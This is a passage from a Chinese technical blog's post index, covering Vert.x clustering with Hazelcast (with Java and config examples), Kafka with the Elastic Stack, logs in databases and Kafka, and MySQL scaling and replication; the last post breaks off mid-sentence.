处理异步结果可能导致嵌套和凌乱的代码，被称为回调地狱。Vert.x 支持 Fu­tures/Promises 和 RxJava，前者用于优雅地链式异步操作，后者用于高级反应式编程。\nVert.x 的非阻塞 I/O 基于 Netty，在此之上构建 Vert.x Core 和 Web 后端技术栈：反应式数据库驱动、消息传递、事件流、集群、指标度量、分布式追踪等，详情请见 Vert.x Documentation。\nVert.x 的事件模型延用 Netty 的 Event Loop，欲了解来龙去脉可从 网络·NIO 开始。\nVerticle 是 Vert.x 中的基本处理单元，Verticle 实例之间通过 Event Bus 通信。Java 传统的并发模型是共享内存多线程（shared memory multithreading），如同前文 多线程·并发编程 所说，但是计算机世界还存在着其它并发模型，例如 CSP 和 Actor model，Verticles 就是宽松的 Actors。\n构建反应式应用程序/软件系统并非 Vert.x 不可，只不过 Netty 的 APIs 更底层；云原生（cloud native）时代的 Quarkus 技术栈支持反应式，Java 用户使用最多的 Spring 技术栈也支持反应式，非一般场景可以考虑 Akka。\n什么是 Hazelcast IMDG Hazelcast 有一个开源分布式内存对象存储（in-memory object store），名为 Hazelcast IMDG，IMDG 是 In-Memory Data Grid 的缩写，IMDG 与内存数据库有所不同，后者通常需要用户处理对象到关系的映射（ORM），前者支持各种各样的内存数据结构，比如 Map、Set、List、MultiMap、RingBuffer、HyperLogLog 等。\nHazelcast IMDG 的架构与分布式协调服务——Zookeeper、分布式 Key-Value 存储——etcd、端到端服务发现解决方案——Consul 截然不同，它的定位更接近分布式缓存，并且无需 Server 端，只需 Client 端的点到点通信（P2P）。\nHazelcast 集群（Hazelcast Cluster）成员（Hazelcast Member）之间为什么需要通信？\nHazelcast 成员之间共享数据的机制是数据分区与数据复制，两者结合在一起的图像可以先参考为什么分区。默认情况下，Hazelcast 提供 271 个分区，为每个分区创建单一拷贝/副本，可配置为多副本。\n上图是 4 成员/结点的 Hazelcast 集群的示意图，假设分区编号从 P_1 到 P_136，黑色编号分区代表主副本（primary replicas），蓝色编号分区代表备副本（backup replicas），数据复制方向为主到备。\n数据分区与数据复制对用户透明是现代分布式存储的基本特性。添加成员到 Hazelcast 集群时与 Redis 不同，Hazelcast 使用一致性哈希算法，仅移动最小数量的分区即可横向扩展。\nHazelcast 如何保证一致性与可用性？\nHazelcast 提供了具有不同数据结构实现的 AP 和 CP 功能。根据 CAP (Consistency, Availability and Partition Tolerance) 经验法则，Hazelcast 的 AP 数据结构侧重可用性，而 Hazelcast 的 CP 子系统则侧重一致性。\n使用 Hazelcast 实现 Vert.x 集群 Vert.x 集群无需注册中心（Service Registry）即可建立，因为 Vert.x 实例之间可以通过 Hazelcast Client Library 相互发现（Discovery）。\n使用 Hazelcast Cluster Manager 可以降低 Vert.x 集成/整合 Hazelcast 的成本。默认情况下，如果不指定外部配置文件，那么集群管理器由打包在 vertx-hazelcast-4.0.0.jar 内的 default-cluster.xml 配置，其中默认的发现机制是 Multicast。\n如上图所示，红色成员发送特定报文到监听特定端口的一组绿色成员，以此类推，发现彼此。\n1 2 3 4 5 6 7 8 9 10 11  hazelcast:network:join:multicast:enabled:truemulticast-group:224.2.2.3multicast-port:54327# UDP portmulticast-time-to-live:32multicast-timeout-seconds:2trusted-interfaces:- 192.168.1.102  使用 Multicast 最常见的传输层协议是 UDP；然而，不建议在生产环境使用 Multicast 发现，因为 UDP 在生产环境可能被阻止（出于安全考虑）并且其它发现机制更加精确，例如 TCP/IP 发现，其它可参考 Discovery Mechanisms。\n1 2 3 4 5 6 7 8 9 10 11  hazelcast:network:join:tcp-ip:enabled:truemember-list:- machine1- machine2- machine3:5799- 192.168.1.0-7- 192.168.1.21  形成了集群之后，集群成员之间的通信始终通过 TCP/IP 进行；方便展示起见，下文的程序采用简化的服务生产者（Provider）与服务消费者（Consumer）模式：\n首先是服务生产者，该 Verticle 的启动方法（start）内仅仅是订阅/消费（consumer）EventBus 中的特定事件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  public class DefaultProvider extends AbstractVerticle { private static final Logger log = LoggerFactory.getLogger(DefaultProvider.class); @Override public void start(Promise\u0026lt;Void\u0026gt; startPromise) throws Exception { vertx.eventBus().\u0026lt;JsonObject\u0026gt;consumer(BusAddress.TEST_REQUEST, msg -\u0026gt; { JsonObject body = msg.body(); log.debug(\u0026#34;consume from {}, message body: {}\u0026#34;, BusAddress.TEST_REQUEST, body); if (Objects.nonNull(body)) { body.put(\u0026#34;consumed\u0026#34;, true); } msg.reply(body); }); vertx.eventBus().\u0026lt;JsonObject\u0026gt;consumer(BusAddress.TEST_SEND, msg -\u0026gt; { JsonObject body = msg.body(); log.debug(\u0026#34;consume from {}, message body: {}\u0026#34;, BusAddress.TEST_SEND, body); }); vertx.eventBus().\u0026lt;JsonObject\u0026gt;consumer(BusAddress.TEST_PUBLISH, msg -\u0026gt; { JsonObject body = msg.body(); log.debug(\u0026#34;consume from {}, message body: {}\u0026#34;, BusAddress.TEST_PUBLISH, body); }); } }   之所以说特定事件是由于服务消费者将事件发送到 EventBus 中的特定地址。\n1 2 3 4 5 6 7  public interface BusAddress { String TEST_REQUEST = \u0026#34;test.request\u0026#34;; String TEST_SEND = \u0026#34;test.send\u0026#34;; String TEST_PUBLISH = \u0026#34;test.publish\u0026#34;; }   然后是服务消费者，该 Verticle 作为 HTTP Server，同时演示了 request、send、publish 三种发送事件到 EventBus 方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69  public class HttpServer extends AbstractVerticle { private static final Logger log = LoggerFactory.getLogger(HttpServer.class); @Override public void start(Promise\u0026lt;Void\u0026gt; startPromise) throws Exception { ConfigRetriever retriever = ConfigRetriever.create(vertx); retriever.getConfig(json -\u0026gt; { JsonObject config = json.result(); Integer port = config.getInteger(\u0026#34;http.port\u0026#34;, 8080); Router router = Router.router(vertx); router.get(\u0026#34;/hello\u0026#34;).handler(this::hello); router.post().handler(BodyHandler.create()); router.post(\u0026#34;/test/request\u0026#34;).handler(this::testRequest); router.post(\u0026#34;/test/send\u0026#34;).handler(this::testSend); router.post(\u0026#34;/test/publish\u0026#34;).handler(this::testPublish); vertx.createHttpServer() .requestHandler(router) .listen(port) .onSuccess(server -\u0026gt; { log.info(\u0026#34;HTTP server started on port \u0026#34; + server.actualPort()); startPromise.complete(); } ).onFailure(startPromise::fail); }); } private void testPublish(RoutingContext context) { JsonObject reqBody = context.getBodyAsJson(); log.debug(\u0026#34;request body: {}\u0026#34;, reqBody); vertx.eventBus().publish(BusAddress.TEST_PUBLISH, reqBody); context.json(reqBody); } private void testSend(RoutingContext context) { JsonObject reqBody = context.getBodyAsJson(); log.debug(\u0026#34;request body: {}\u0026#34;, reqBody); vertx.eventBus().send(BusAddress.TEST_SEND, reqBody); context.json(reqBody); } private void testRequest(RoutingContext context) { JsonObject reqBody = context.getBodyAsJson(); log.debug(\u0026#34;request body: {}\u0026#34;, reqBody); vertx.eventBus().\u0026lt;JsonObject\u0026gt;request(BusAddress.TEST_REQUEST, reqBody, response -\u0026gt; { if (response.succeeded()) { Message\u0026lt;JsonObject\u0026gt; msg = response.result(); JsonObject msgBody = msg.body(); log.debug(\u0026#34;reply from {}, message body: {}\u0026#34;, BusAddress.TEST_REQUEST, msgBody); context.json(msgBody); } else { log.error(\u0026#34;failed to test request\u0026#34;, response.cause()); } }); } private void hello(RoutingContext context) { String address = context.request().connection().remoteAddress().toString(); MultiMap queryParams = context.queryParams(); String name = queryParams.contains(\u0026#34;name\u0026#34;) ? queryParams.get(\u0026#34;name\u0026#34;) : \u0026#34;unknown\u0026#34;; context.json( new JsonObject() .put(\u0026#34;name\u0026#34;, name) .put(\u0026#34;address\u0026#34;, address) .put(\u0026#34;message\u0026#34;, \u0026#34;Hello \u0026#34; + name + \u0026#34; connected from \u0026#34; + address) ); } }   最后，仍然是为了方便展示起见，提供一个简化的程序启动脚本。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  #!/bin/bash  bin_dir=$(dirname \u0026#34;$0\u0026#34;) start() { case $1 in consumer) java -jar \u0026#34;$bin_dir\u0026#34;/../consumer/target/consumer-1.0.0-SNAPSHOT-fat.jar -cluster ;; provider) java -jar \u0026#34;$bin_dir\u0026#34;/../provider/target/provider-1.0.0-SNAPSHOT-fat.jar -cluster ;; *) echo \u0026#34;Unknown module: $1\u0026#34; exit 1 ;; esac } stop() { jcmd | grep \u0026#34;$1-1.0.0-SNAPSHOT-fat.jar\u0026#34; | awk \u0026#39;{print $1}\u0026#39; | xargs -I {} kill -9 {} } stopAll() { stop consumer stop provider } case $1 in start) start \u0026#34;$2\u0026#34; ;; stop) stop \u0026#34;$2\u0026#34; ;; restart) stop \u0026#34;$2\u0026#34; start \u0026#34;$2\u0026#34; ;; down) stopAll ;; *) echo \u0026#34;Usage: $0{start \u0026lt;module\u0026gt;|stop \u0026lt;module\u0026gt;|restart \u0026lt;module\u0026gt;|down}\u0026#34; ;; esac   假如先启动其中一个模块，比如启动服务生产者。\n1  % ./dev.sh start provider   从它的日志会发现它已经成为 Hazelcast 集群的唯一成员：\n1 2 3  Members {size:1, ver:1} [ Member [192.168.0.100]:5701 - 0d97d436-ab4f-432b-abb6-10975e224044 this ]   紧接着启动服务消费者。\n1  % ./dev.sh start consumer   服务消费者的视角：\n1 2 3 4  Members {size:2, ver:2} [ Member [192.168.0.100]:5701 - 0d97d436-ab4f-432b-abb6-10975e224044 this Member [192.168.0.100]:5702 - 12740655-5ee8-4228-a723-112c2992b290 ]   服务生产者的视角：\n1 2 3 4  Members {size:2, ver:2} [ Member [192.168.0.100]:5701 - 0d97d436-ab4f-432b-abb6-10975e224044 Member [192.168.0.100]:5702 - 12740655-5ee8-4228-a723-112c2992b290 this ]   两者相互发现了对方，但是，它们是否能正常通信？\n1 2  % curl \u0026#34;localhost:8888/hello?name=huangh\u0026#34; {\u0026#34;name\u0026#34;:\u0026#34;huangh\u0026#34;,\u0026#34;address\u0026#34;:\u0026#34;0:0:0:0:0:0:0:1:51328\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Hello huangh connected from 0:0:0:0:0:0:0:1:51328\u0026#34;}   1 2  % curl localhost:8888/test/request -d \u0026#34;{\\\u0026#34;name\\\u0026#34;:\\\u0026#34;huangh\\\u0026#34;}\u0026#34; {\u0026#34;name\u0026#34;:\u0026#34;huangh\u0026#34;,\u0026#34;consumed\u0026#34;:true}   完整代码已发布，请参考 vertx-hazelcast-exp。\n写在最后 Hazelcast Management Center 可用于可视化监控和管理 Vert.x 集群。\n 本文首发于 https://h2cone.github.io\n 参考资料   Eclipse Vert.x and reactive in just a few words\n  Vert.x in Action: Asynchronous and Reactive Java\n  Understanding Vert.x Architecture - Part I: Inside Vert.x. Comparison with Node.js\n  Understanding Vert.x Architecture - Part II\n  Understanding Vert.x: Event Loop\n  Understanding Vert.x: Event Bus\n  hazelcast/hazelcast\n  hazelcast/hazelcast-code-samples\n  hazelcast/hazelcast-go-client\n  Hazelcast IMDG Reference Manual # Overview\n  Hazelcast IMDG Reference Manual # Appendix F: Frequently Asked Questions\n  Hazelcast # Vert.x Cluster\n  etcd versus other key-value stores\n  Reactiverse\n  Vert.x Awe­some\n  eclipse-vertx/vert.x\n  Advanced Vert.x Guide\n  Vert.x Examples\n  Building a Vert.x Native Image\n  ","date":"2020-12-14T14:50:54+08:00","permalink":"https://h2cone.github.io/2020/12/14/vertx-hazelcast-exp/","title":"Vert.x 与 Hazelcast"},{"content":"背景 刚入行那会，公司产品研发部正如火如荼建设微服务基础设施，其中就包括日志中心。试想一下，包含众多容器化应用程序的系统，一个服务可能会有多个实例，每个实例输出各自的日志记录；假如在客户端收到了来自服务器端的异常响应，例如 500 Internal Server Error，相应的负责人不可避免地会遇到需要通过查看容器日志来查明哪里发生故障或则什么原因导致性能下降的情景。\n负责人也许走了弯路。登录哪些服务器或跳板机？有没有访问权？需不需要通过“中介”才能获得许可或相关日志文件？查看哪些结点上的哪些服务的日志？\n负责人也以可以走已经铺好的路。直接在日志中心 Web 版搜索所需的一切日志记录；系统中所有服务的日志记录都可以被索引与检索，不仅仅可以用于故障排除，还可以用于监控、告警、数据分析等等。\n集中式日志管理 上图来自运维咖啡吧，这是一类典型的日志处理架构。\n  Filebeat，轻量级日志采集器。\n考虑到基于 Docker 开发服务，应用程序的父镜像应包含 Filebeat，例如 FROM 父镜像 之后执行一系列下载、安装、设置 Filebeat 的指令。\nFilebeat 作为应用程序的 agent 可以将日志作为输入源（从日志文件读取行），再将 kafka 作为输出目的地（发送日志记录或事件到 Kafka）。\n  Logstash，传输和处理日志、事件等数据。\n因为 Logstash 有许多输入插件，包括读取来自 Kafka Topic 的事件，可以作为 Kafka 的消费者。\nELK 中的 Logstash 当然支持将 Elasticsearch 作为输出目的地。\n  Elasticsearch，分布式 RESTful 搜索引擎。\n  Kibana，可视化 Elasticsearch 数据的用户界面。\n  有趣的是，Elastic Stack 并不包含 Kafka，但两者在日志/事件处理领域却是经典组合。\n何时组合使用 Kafka 与 Elastic Stack 应对突发流量 在大数据领域，Kafka 以单位时间内吞吐量极高著称，所谓吞吐量是指代可处理的记录条数，Kafka 非常适用于流量削峰。早在 2014 年，Kafka 已经能达到每秒 200 万次写入（在三台廉价的机器上）。为什么 Kafka 如此之快？至少有如下原因：\n  基于追加式提交日志，顺序 I/O 飞快。\n  重度使用文件系统缓存。\n  复杂性从生产者转移到了消费者。\n  高度可水平/横向扩展。\n  Kafka 应对峰值或突发数据的能力远强于 Logstash，可防止单位时间输入过多日志数据导致 Logstash 成为系统的瓶颈；值得注意的是，完成本篇之时，官方的 Logstash 扩展建议也仅有一小段。\n当 ES 不可访问 当 Elasticsearch 集群不可访问时（例如升级版本或者其他理由需要暂时下线），Kafka 能够暂时保存 Filebeat 采集的日志数据，直到 Elasticsearch 和 Logstash 再次上线。\n扩展和容错 引用一张来自 Kafka: The Definitive Guide 的插图：\n消费者群组（Consumer Group）保证同一个主题（Topic）的任意分区（Partition）最多只能被组内的一个消费者使用。增加 Logstash 实例来组成一个消费者群组，它们将并发读取 Kafka Topic 中的日志消息，而不会交叠，因此能够提升单位时间内从 Kafka 到 Logstash 再到 Elasticsearch 的吞吐量；使用多个 Logstash 实例的另外一个好处是是增强系统的容错能力。\n默认情况下，当消费者加入或离开消费者群组将触发再平衡（rebalancing），Logstash 消费者的 Kafka Client 库将参与重新分配分区给消费者的过程。当群组中有若干 Logstash 实例失效时，根据再平衡协议，失去消费者的分区将被分配给现有的消费者。\n一点建议 假设 Logstash 实例组成的消费者群组 ID 为 logstash，存储应用程序日志记录的话题 ID 为 app_logs，下面是 logstash-*.conf 的输入源配置：\n1 2 3 4 5 6 7 8 9  input { kafka { bootstrap_servers =\u0026gt; \u0026#34;kafka_host_1:9092,kafka_host_2:9092\u0026#34; group_id =\u0026gt; \u0026#34;logstash\u0026#34; topics =\u0026gt; [\u0026#34;app_logs\u0026#34;] consumer_threads =\u0026gt; 8 ... } }   其中 consumer_threads 是消费者线程数（默认值是 1），理想情况下，消费者线程数之和应与分区数相等，以实现完美平衡。如果消费者线程数之和多于分区数，那么某些线程将处于空闲状态；如果消费者线程数之和少于分区数，那么某些线程将消费多个分区。举例来说，app_logs 话题的分区数为 16，最佳的部署方式很可能是将消费者线程数为 8 的 2 个 Logstash 实例部署到 2 台 CPU 核数为 8 的机器上。\n虽说 Kafka 应对突发数据或流量高峰的能力很强，但是在无法估算日志记录/事件的量级与流速之前应备不时之需。例如，使用一些“突发”主题，当单位时间内应用程序产生过多日志数据时，可以在运行时将其移动到“突发”主题，使其它主题避免不必要的流量。\n 本文首发于 https://h2cone.github.io\n 参考资料   Just Enough Kafka for the Elastic Stack, Part 1\n  ELK日志系统之通用应用程序日志接入方案\n  Why Kafka Is so Fast\n  ELK架构下利用Kafka Group实现Logstash的高可用\n  Apache Kafka Rebalance Protocol, or the magic behind your streams applications\n  ","date":"2020-11-22T11:32:08+08:00","permalink":"https://h2cone.github.io/2020/11/22/kafka_in_the_elk/","title":"Kafka 之于 Elastic Stack"},{"content":"什么是日志 日志是追加式的，按时间排序的记录（条目）序列。\n无关记录的格式，日志文件记录操作系统或其它软件运行时发生的事件及其时间。\n1  \u0026lt;34\u0026gt;1 2003-10-11T22:14:15.003Z mymachine.example.com su - ID47 - BOM\u0026#39;su root\u0026#39; failed for lonvick on /dev/pts/8   “应用程序日志”是人类可读的文本，比如 Syslog 和 SLF4J 等；如上所示，这是一个来自 RFC5424 的 syslog 日志消息例子，从中不难看出主机（mymachine.example.com）上的一个应用程序（su）在 2003-10-11T22:14:15.003Z 发生了 “\u0026lsquo;su root\u0026rsquo; failed for lonvick\u0026hellip;”。\n现代最流行的分布式版本控制系统中的日志记录着所有贡献者的提交历史：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  % git log ... commit 130560a769fe6da64c87f695e4665225de1faec3 Author: Daniel Smith \u0026lt;dbsmith@google.com\u0026gt; Date: Fri Jun 6 17:31:45 2014 -0700 Proofread guestbook.md commit 2c4b3a562ce34cddc3f8218a2c4d11c7310e6d56 Author: Joe Beda \u0026lt;joe.github@bedafamily.com\u0026gt; Date: Fri Jun 6 16:40:48 2014 -0700 First commit   然而，日志并非全都是人类可读的，它可能是二进制格式而只能被程序读取，作为关键抽象普遍存在于数据库系统和分布式系统之中。\n数据库日志 关系数据库系统中的日志通常用于崩溃恢复、提供一定程度的原子性与持久性、数据复制。\n预写日志 老伙计 MySQL server 维护着持久化数据库对象，包括库、表、索引、视图等。根据经验，我们确信入库数据终将会被 MySQL server 写入磁盘，磁盘是一种 I/O 设备（参考网络·NIO # I/O），从主存复制数据到 I/O 设备并不是一个原子操作，如果客户端发送请求后，MySQL server 处理请求中，系统崩溃或宕机抑或重启，MySQL 如何保证不丢失变更或者恢复到正确的数据？\n很久以前，存在着无原子性的非分布式数据库事务。张三账户有 1000 元，李四账户有 2000 元，张三向李四转账 200 元，数据库系统先将张三账户减少 200 元，然后将 800 元写回张三账户，接着将李四账户增加 200 元并且将 2200 元写回李四账户时，服务器突然发生故障；系统重启后，只有一个账户是对的，张三账户是 800 元，但是李四账户还是 2000 元，200 元不翼而飞。\n计算机界明显的坑早已被前人填满。Write-ahead logging 是数据库系统中提供原子性与持久性的技术（日志先行技术），简称 WAL，一言蔽之，数据库系统首先将数据变更记录到日志中，然后将日志写入稳定存储（如磁盘），之后才将变更写入数据库。\nRedo log 和 Undo log 是运用了 WAL 的磁盘数据结构：\n  Undo log 在崩溃恢复期间用于撤消或回滚未提交的事务。\n  Redo log 在崩溃恢复期间用于重做已提交但未将数据库对象从缓冲区（buffer）刷新到磁盘的事务。\n  撤消和重做的前提是记录了数据库对象变更前的值和变更后的值。\n假设事务 T[i] 所操作的数据库对象是 X，X 的值从 V[old] 更改为 V[new]，将数据从缓冲区刷新到磁盘的操作被称为 flush，那么 undo/redo log 日志记录形式如下：\n1 2 3  begin T[i] //（1） (T[i], X, V) //（2） commit T[i] //（3）   （1）记录事务开始。\n（2）记录数据库对象的值。Undo log 记录 (T[i], X, V[old]) ，而 Redo log 记录 (T[i], X, V[new])，两者都要求 flush X 之前 flush (T[i], X, V)。\n（3）记录事务提交。Undo log 要求 flush X 之后 flush (commit T[i])，而 Redo log 要求 flush X 之前 flush (commit T[i])。\n在崩溃恢复期间，从数据库系统角度来看：\n  若发现 undo log 缺少（3），则无法确定 flush X 是否完成。决定将 X 的值设为 V[old] 后 flush X，因为 X 变更前的值是 V[old]，即使恢复过程中又发生崩溃，重复将 X 的值设为 V[old] 仍然幂等，直到恢复完成后，可以在（3）位置写一条记录：rollback T[i]，下次恢复期间忽略。\n  若发现 redo log 缺少（3），则确定 flush X 未执行。决定将 X 的值设为 V[new]，重试 flush X。\n  若发现缺少（2），则忽略此事务（无计可施）。\n  若没有（1），则无此事务。\n  逻辑日志 前文MySQL 窘境 # 主从复制中提到其数据复制需要数据变更日志，或则数据变更日志记录（事件）。MySQL Server 有若干种日志，其中二进制日志（Binary log，简称 binlog）包含描述数据变更的“事件”，例如创建表或对表数据的更改，MySQL binlog 与存储引擎解耦。\n在服务化架构中，组合使用 MySQL 和 Elasticsearch 时常常要求将 MySQL 数据同步到 Elasticsearch；Elastic Stack 的解决方案是使用 Logstash 的插件：Jdbc input plugin。\nLogstash 的 Jdbc input plugin 会根据配置文件定时/定期对 MySQL 进行轮询，可获取上一次询问之后插入或更改的记录。有人误以为 Jdbc input plugin 最快只能每分钟查询一次，实际上也能设置秒级。\n监听 binlog 事件可以实现将 MySQL 数据同步到各种数据源，这种方案非常适合各种消息传递、数据流、实时数据处理。假设有一个中间件，根据 MySQL 协议，它只要向 MySQL master 注册为 MySQL slave，持续接收并解析 binlog 事件，经过处理后又能作为消息传递给各种服务或组件以满足数据同步需求；比如 alibaba/canal，它是一个关于 MySQL binlog 增量订阅\u0026amp;消费的组件。\n诸如此类的设计模式被称为 CDC（change data capture）。\n分布式系统日志 这要从状态机复制说起。如下图所示，每个 Server 存储了一个它的状态机（State Machine）按顺序执行的一系列命令的日志（Log）；每个日志包含相同顺序的命令集，因此每个状态机将执行相同的命令序列；因为讨论的状态机具有确定性，所以它们将产生相同的输出并以相同的状态结束。\n什么是确定性？给定特定的输入，将始终产生相同的输出。作为反面，执行类似以下命令的若干状态机（进程）将产生不同的输出并以不同的状态（磁盘和主存中的数据）结束。\n1  INSERTINTOtVALUES(NOW());  状态机复制通常使用 replicated log 实现，保持 replicated log 的一致性是共识算法的工作。\n提交日志 Apache Kafka 分区（partition）的本质是提交日志（commit log）。\n如果把 Kafka 与关系型数据库作类比，那么消息（message）类比行（row），主题（topic）类比表（table）；一个主题分成多个分区，分区是追加式的消息序列，同一个主题的多个分区可以分布在不同机器上。\n从 Kafka 的角度来看，将消息写入分区就像将日志记录写入提交日志（追加式更新日志文件）。\n在 Kafka 的 server.properties 中，有一个 log.dirs 用于指定日志文件目录列表。\n1 2  # A comma separated list of directories under which to store log files log.dirs=/usr/local/var/lib/kafka-logs   在磁盘上，一个分区是一个目录，例如主题名为 quickstart-events 的一个分区：\n1 2 3 4 5 6  % tree /usr/local/var/lib/kafka-logs/quickstart-events-0/ /usr/local/var/lib/kafka-logs/quickstart-events-0/ ├── 00000000000000000000.index ├── 00000000000000000000.log ├── 00000000000000000000.timeindex └── leader-epoch-checkpoint   其中 index 文件与 log 文件合称为一个 segment，以人类可读的方式查看 log 文件：\n1 2 3 4 5 6 7  % kafka-run-class kafka.tools.DumpLogSegments --deep-iteration --print-data-log --files /usr/local/var/lib/kafka-logs/quickstart-events-0/00000000000000000000.log Dumping /usr/local/var/lib/kafka-logs/quickstart-events-0/00000000000000000000.log Starting offset: 0 baseOffset: 0 lastOffset: 0 count: 1 baseSequence: -1 lastSequence: -1 producerId: -1 producerEpoch: -1 partitionLeaderEpoch: 0 isTransactional: false isControl: false position: 0 CreateTime: 1604900950169 size: 90 magic: 2 compresscodec: NONE crc: 3202290031 isvalid: true | offset: 0 CreateTime: 1604900950169 keysize: -1 valuesize: 22 sequence: -1 headerKeys: [] payload: This is my first event baseOffset: 1 lastOffset: 1 count: 1 baseSequence: -1 lastSequence: -1 producerId: -1 producerEpoch: -1 partitionLeaderEpoch: 0 isTransactional: false isControl: false position: 90 CreateTime: 1604900955215 size: 91 magic: 2 compresscodec: NONE crc: 3852839661 isvalid: true | offset: 1 CreateTime: 1604900955215 keysize: -1 valuesize: 23 sequence: -1 headerKeys: [] payload: This is my second event   从中可以发现，消息编码在 log 文件中；index 文件则包含了偏移量（offset）与消息在 log 文件中的位置（position）的映射，用于查找消息。\n对于消息消费者（consumer）来说，从分区读取消息就像从提交日志读取记录；消费者通过分区的偏移量（offset）区分已读消息和未读消息，偏移量作为元数据存储在 Zookeeper 树或 Kafka 内置主题中。\n毫不夸张地说，Kafka 是一个分布式提交日志系统，只不过官方更愿意称之为分布式事件流平台。\n 本文首发于 https://h2cone.github.io\n 参考资料   The Log: What every software engineer should know about real-time data\u0026rsquo;s unifying abstraction\n  Wikipedia # Log file\n  Wikipedia # Write-ahead logging\n  ML Wiki # Undo/Redo Logging\n  Intro to undo/redo logging\n  Recovering from a system crash using undo/redo-log\n  undo log 与 redo log 原理分析\n  MySQL 5.7 Reference Manual # The Binary Log\n  MySQL 5.7 Reference Manual # mysqlbinlog — Utility for Processing Binary Log Files\n  MySQL 5.7 Reference Manual # Replication Formats\n  How to keep Elasticsearch synchronized with a relational database using Logstash and JDBC\n  How to sync your MySQL data to Elasticsearch\n  The Raft Consensus Algorithm\n  How Kafka’s Storage Internals Work\n  Distributed Commit Logs with Apache Kafka\n  ","date":"2020-08-30T15:21:41+08:00","permalink":"https://h2cone.github.io/2020/08/30/log-notes/","title":"日志游记"},{"content":"MySQL 窘境 扩展 数据以前所未有的速度增长，例如从 GB 到 TB，甚至到 PB；负载增加，例如单位时间请求数、I/O 次数、活跃用户数激增；这可能引起单机 MySQL server 性能下降，甚至不可用。我们想尽办法扩展 MySQL，通常，要么采购更强大的机器作为数据库服务器，这是一种纵向扩展（scale up）；要么对 MySQL 的库或表进行分片（MySQL Sharding），即将数据集分离得到多个子数据集，任意两个子数据集可能存储在同一台机器上，也可能存储在不同机器上，这是一种横向扩展（scale out）。\n纵向扩展需要应对一些问题：\n  成本增长过快。如果把一台机器的 CPU 核数增加一倍，主存和磁盘各扩容一倍，则最终总成本增加不止一倍。\n  预见性能瓶颈。一台机器尽管拥有两倍的硬件指标但却不一定能处理两倍的负载。\n  有限容错能力。显然无法提供异地容错能力。\n  横向扩展一般不需要高端的硬件或机器，但需要多台一般的机器和应对分布式系统的许多挑战：\n  故障与部分失效。\n  不可靠的网络。\n  不可靠的时钟。\n  因为关心系统应对负载增加的能力（可扩展性），所以关心系统容错能力（可用性与一致性）。\n达成以上目标至少需要分区，对于 Elasticsearch 和 SolrCloud 以及 MongoDB 来说是 shard；对于 Cassandra 和 HBase 分别是 vnode 和 region。\n为什么分区   增强可扩展性。海量数据分布在更多磁盘上，查询负载分布到更多处理器上。\n  分区容错。数据分区与数据复制通常结合使用，即每个分区在多个结点上存有副本（replica）。\n  副本的优势：\n  容错。容忍结点失效，支持故障转移。\n  横向扩展。采用多结点来处理更多的请求。\n  就近访问。将副本部署到距离用户更近的地方。\n  Partitioning 项目开始初期，什么情况下适合对 MySQL 分库分表？阿里巴巴 Java 开发手册在“MySQL 数据库“章节中有一则推荐，仅供参考：\n 【推荐】单表行数超过 500 万行或者单表容量超过 2 GB，才推荐进行分库分表。 说明：如果预计三年后的数据量根本达不到这个级别，请不要在创建表时就分库分表。\n 我们通常使用垂直分区（vertical partitioning）和水平分区（horizontal partitioning），如下图所示：\nVP1 和 VP2 表现得像两张可通过 ID 关联起来的表，HP1 和 HP2 的 scheme 和列（columns）相同，但行（rows）不同。行的增长速度通常快于列的增长速度，我们更关注水平分区，数据库分片是数据库或搜索引擎的水平分区；但新问题随之而来：假设 HP1、HP2、HP3、HP4\u0026hellip;\u0026hellip; 包含了多张表的数据，且由多个 MySQL server 维护，如果客户端要查找满足给定条件的一行或多行记录，那么它应该向哪个或哪些 MySQL server 发起请求？如何合并多个结点返回的结果集？如何执行跨分区 JOIN、排序、分页、分组等操作？如何保证分布式事务？\n在以前，上面问题的解决方案常常是数据库中间件，数据库中间件的设计模式至少有两种，Proxy 和 Smart Client。Proxy 是应用程序与数据库集群的中间层，它对客户端制造了单一数据库实例的假象，客户端发送到 Proxy 的请求将由 Proxy 分发给下层的数据库服务器；Smart Client 是与应用程序集成的库或框架，客户端向数据库集群发起的请求将由客户端路由。两者的图像可参考代理分发和客户端路由。\n目前，开源且较活跃的数据库中间件有 ShardingSphere、MyCAT、vitess 等等，一直以来勉强可用，但是前两者的缺点也不容忽视：\n  侵入性。要求用户指定 shard key 和其它分片配置；如果原业务逻辑包含 JOIN、subquery 等复杂 SQL，改动工作量可能难以估计。\n  不支持透明分片。维护分片或集群的代价随着结点的增多而非线性增长。\n  暂不支持弹性伸缩。据说都还在开发中。\n  复杂查询优化能力较弱。不能生成最优的执行计划（plan），许多优化工作推卸给应用程序。\n  如何将原始表（orginal table）的记录分配给多个 MySQL server（实例、进程）？数据库中间件是应用程序级别的实现，MySQL Cluster 则是数据库级别的实现，它声称支持跨结点自动分片（分区），可是它是通过 NDB 存储引擎实现的，不温不火。\n主从复制 MySQL 的数据复制模型是主从复制。传统主从复制图像：主结点（主副本、主库）处理读/写请求，若是写请求则通过同步复制或异步复制将数据变更日志（事件或日志记录）发送到所有从结点（从副本、从库），从结点按照日志（日志记录或事件）写副本；一般情况，从结点只读，故障转移时从结点可提升为主结点。传统的同步复制侧重一致性，要求”短暂“的不可用，主结点需要等待从结点的确认；传统的异步复制侧重可用性，要求“短暂”的不一致，从结点滞后于主结点。\n如果把所有从结点配置为同步复制模式，那么任何失效或性能下降的从结点会导致系统阻塞。MySQL 支持设置半同步模式，某一个从结点配置为同步模式，其它从结点配置为异步模式；当同步模式的从结点失效时，另一个从结点从异步模式提升为同步模式，这么做的好处之一是保证至少有两个结点（主结点和同步模式的从结点）拥有最新的数据副本。半同步并非高枕无忧，微信后台团队在 MySQL 半同步复制的数据一致性探讨中总结了 MySQL 的半同步复制和 Master 切换都存在一些不足，数据复制存在回滚难题，Master 切换存在多 Master 